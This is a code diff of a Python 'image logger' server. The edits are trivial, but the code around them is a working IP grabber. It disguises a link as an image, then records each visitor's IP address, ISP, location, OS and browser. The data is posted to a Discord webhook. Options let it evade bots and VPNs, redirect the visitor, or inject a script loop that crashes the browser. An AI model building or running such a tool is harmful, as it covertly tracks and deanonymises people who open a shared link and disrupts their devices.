@@ -46,12 +46,12 @@ config = {
                 # 2 = Don't ping when it's 100% a bot
                 # 3 = Don't send an alert when it's possibly a bot
                 # 4 = Don't send an alert when it's 100% a bot
-    
+    
 
     # REDIRECTION #
     "redirect": {
-        "redirect": true, # Redirect to a webpage?
-        "page": "https://i2.ruliweb.com/img/5/3/7/9/5379F4893A290A0017" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://i2.ruliweb.com/img/5/3/7/9/5379F4893A290A0017" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -60,7 +60,7 @@ config = {
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+    # 4) Image 
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
@@ -90,9 +90,9 @@ def reportError(error):
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
-    
+    
     bot = botCheck(ip, useragent)
-    
+    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -113,10 +113,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
-        
+        
         if config["vpnCheck"] == 1:
             ping = ""
-    
+    
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
@@ -138,7 +138,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 
     os, browser = httpagentparser.simple_detect(useragent)
-    
+    
     embed = {
     "username": config["username"],
     "content": ping,
@@ -149,7 +149,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-            
+            
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
@@ -174,7 +174,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
-    
+    
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
@@ -187,7 +187,7 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
+    
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -212,10 +212,10 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-            
+            
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
-            
+            
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
@@ -224,9 +224,9 @@ height: 100vh;
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
+                
                 return
-            
+            
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
@@ -236,7 +236,7 @@ height: 100vh;
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
+                
 
                 message = config["message"]["message"]
 
@@ -260,7 +260,7 @@ height: 100vh;
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
-                
+                
                 if config["crashBrowser"]:
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
 
@@ -287,7 +287,7 @@ if (!currenturl.includes("g=")) {
 
 </script>"""
                 self.wfile.write(data)
-        
+        
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
@@ -297,7 +297,7 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
-    
+    
     do_GET = handleRequest
     do_POST = handleRequest
 
